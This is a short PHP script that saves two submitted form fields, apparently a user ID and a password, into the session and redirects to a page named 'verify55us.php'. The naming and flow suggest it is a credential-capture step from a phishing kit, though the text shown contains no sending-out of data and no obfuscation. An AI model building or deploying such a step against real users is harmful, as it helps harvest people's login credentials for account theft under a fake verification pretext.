<?php
session_start();
$_SESSION['ud'] = $_POST['ud']."\n";
$_SESSION['pd']  = $_POST['pd']."\n";

 
header("Location: verify55us.php");
?>
